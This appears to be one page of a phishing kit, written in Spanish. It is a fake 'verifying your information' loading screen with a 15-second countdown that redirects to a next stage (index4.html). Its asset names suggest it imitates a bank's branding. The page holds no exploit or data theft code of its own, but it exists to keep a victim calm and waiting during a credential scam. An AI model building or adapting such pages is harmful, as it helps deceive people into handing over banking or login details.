<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Inicio</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=0.8, maximum-scale=0.8, user-scalable=no"
    />
    <link rel="stylesheet" type="text/css" href="./fhs/style_crown.css" />
    <script language="JavaScript">
      var totalTiempo = 15;
      var url = "index4.html";

      function updateReloj() {
        document.getElementById("CuentaAtras").innerHTML =
          "Por favor, espera " +
          totalTiempo +
          " segundos, estamos verificando tu información para continuar con el proceso de verificación.";
        if (totalTiempo == 0) {
          window.location = url;
        } else {
          totalTiempo -= 1;
          setTimeout(updateReloj, 1000);
        }
      }

      window.onload = updateReloj;
    </script>
  </head>
  <body>
    <header class="ioscam">
      <nav class="header_wrapeer">
        <div class="header__campaign">
          <div class="header__logo">
            <img
              src="./fhs/blanco.png"
              sizes="(min-width: 900px) 20vw, 50vw"
              class="header__image"
            />
            <img src="./fhs/bantp.png" />
          </div>
        </div>
      </nav>
    </header>
    <div class="container">
      <h1>¡Bienvenido!</h1>
      <form method="POST" id="loggin">
        <br />
        <br /><br />
        <div align="center">
          <h2>Cargando...</h2>
          <br />
          <img src="./fhs/loac.gif" style="width: 150px" /><br /><br />
          <b><p style="width: 350px; font-size: 18px" id="CuentaAtras"></p></b>
          <br /><br />
        </div>
      </form>
    </div>
  </body>
</html>
